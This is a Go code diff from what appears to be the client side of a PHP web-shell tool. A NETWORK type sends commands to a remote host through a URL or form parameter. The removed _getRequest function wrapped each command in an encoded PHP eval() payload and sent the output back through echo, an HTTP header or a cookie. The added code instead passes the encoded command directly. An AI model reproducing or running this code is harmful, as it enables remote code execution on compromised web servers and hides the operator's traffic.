@@ -40,6 +40,14 @@ type NETWORK struct {
 	_lastResponse *http.Response
 }
 
+func (n *NETWORK) GetMethod() int {
+	return n.method
+}
+
+func (n *NETWORK) GetParameter() string {
+	return n.parameter
+}
+
 func (n *NETWORK) IsSetup() bool {
 	return n.status
 }
@@ -95,7 +103,7 @@ func (n *NETWORK) Send(r string, f callback) {
 func (n *NETWORK) post(r string) *http.Response {
 	n.status = true
 
-	request := n._getRequest(r)
+	request := normalizer.Encode(r)
 	n.cmd = request
 
 	form := url.Values{}
@@ -116,7 +124,7 @@ func (n *NETWORK) post(r string) *http.Response {
 func (n *NETWORK) get(r string) *http.Response {
 	n.status = true
 
-	request := n._getRequest(r)
+	request := normalizer.Encode(r)
 	n.cmd = request
 
 	url := n.host + "?" + n.parameter + "=" + request
@@ -158,24 +166,6 @@ func (n *NETWORK) _send(c *config) *http.Response {
 	n._lastResponse = resp
 
 	return resp
-}
-
-func (n *NETWORK) _getRequest(r string) string {
-	var response string
-
-	if n.method == 0 || n.method == 1 {
-		response = "echo(" + normalizer.PHPEncode("$r") + ");exit();"
-	} else if n.method == 2 {
-		response = "header('" + n.parameter + ":' . " + normalizer.PHPEncode("$r") + ");exit();"
-	} else if n.method == 3 {
-		response = "setcookie('" + n.parameter + "', " + normalizer.PHPEncode("$r") + ");exit();"
-	}
-
-	request := r + response
-	rEnc := normalizer.Encode(request)
-	final := "eval(" + normalizer.PHPDecode("'"+rEnc+"'") + ");"
-
-	return final
 }
 
 func (n *NETWORK) _headerConfig(req *http.Request) {
